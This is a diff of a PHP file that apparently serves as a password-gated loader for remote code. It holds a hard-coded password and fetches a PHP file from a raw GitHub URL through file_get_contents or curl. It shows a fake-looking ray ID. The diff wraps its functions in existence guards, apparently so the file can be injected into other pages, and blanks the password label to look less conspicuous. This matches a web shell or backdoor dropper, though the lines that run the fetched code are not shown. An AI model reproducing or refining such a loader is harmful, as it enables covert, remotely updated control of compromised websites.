@@ -1,63 +1,75 @@
 <?php
-session_start();
-
-function get_user_ip() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
-    return $ip;
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
 }
 
-function isAuthenticated() {
-    return isset($_SESSION['gecko_auth']) && $_SESSION['gecko_auth'] === true;
-}
-
-function fetchRemoteContent($url) {
-    $context = stream_context_create([
-        'http' => [
-            'timeout'    => 15,
-            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        ],
-        'ssl' => [
-            'verify_peer'      => true,
-            'verify_peer_name' => true
-        ]
-    ]);
-
-    if (ini_get('allow_url_fopen')) {
-        $content = @file_get_contents($url, false, $context);
-        if ($content !== false) {
-            return $content;
+if (!function_exists('get_user_ip')) {
+    function get_user_ip() {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ip = $_SERVER['REMOTE_ADDR'];
         }
+        return $ip;
     }
+}
 
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL            => $url,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_FOLLOWLOCATION => true,
-            CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_SSL_VERIFYHOST => 2,
-            CURLOPT_TIMEOUT        => 15,
-            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+if (!function_exists('isAuthenticated')) {
+    function isAuthenticated() {
+        return isset($_SESSION['gecko_auth']) && $_SESSION['gecko_auth'] === true;
+    }
+}
+
+if (!function_exists('fetchRemoteContent')) {
+    function fetchRemoteContent($url) {
+        $context = stream_context_create([
+            'http' => [
+                'timeout'    => 15,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ],
+            'ssl' => [
+                'verify_peer'      => true,
+                'verify_peer_name' => true
+            ]
         ]);
-        $content = curl_exec($ch);
-        curl_close($ch);
-        if ($content !== false) {
-            return $content;
-        }
-    }
 
-    return '';
+        if (ini_get('allow_url_fopen')) {
+            $content = @file_get_contents($url, false, $context);
+            if ($content !== false) {
+                return $content;
+            }
+        }
+
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL            => $url,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_SSL_VERIFYPEER => true,
+                CURLOPT_SSL_VERIFYHOST => 2,
+                CURLOPT_TIMEOUT        => 15,
+                CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ]);
+            $content = curl_exec($ch);
+            curl_close($ch);
+            if ($content !== false) {
+                return $content;
+            }
+        }
+
+        return '';
+    }
 }
 
-define('SITE_PASSWORD', 'sipurs');
-define('GITHUB_RAW_URL', 'https://raw.githubusercontent.com/sipurtamvanbangets/sipur/refs/heads/main/sipur.php');
+if (!defined('SITE_PASSWORD')) {
+    define('SITE_PASSWORD', 'sipurs');
+}
+if (!defined('GITHUB_RAW_URL')) {
+    define('GITHUB_RAW_URL', 'https://raw.githubusercontent.com/sipurtamvanbangets/sipur/refs/heads/main/sipur.php');
+}
 
 $githubRawStatus  = '';
 $githubRawContent = '';
@@ -337,7 +349,7 @@ $ray_id = bin2hex(random_bytes(8));
         <div class="password-panel" id="password-panel">
             <?php if (!isAuthenticated()): ?>
                 <form id="password-form" method="post" action="<?php echo htmlspecialchars($scriptPath, ENT_QUOTES, 'UTF-8'); ?>">
-                    <label for="password-input">Password:</label>
+                    <label for="password-input"> </label>
                     <input type="password" id="password-input" name="password_value" placeholder="Enter password" autocomplete="current-password" required>
                     <button type="submit" class="submit-button">Log in</button>
                 </form>
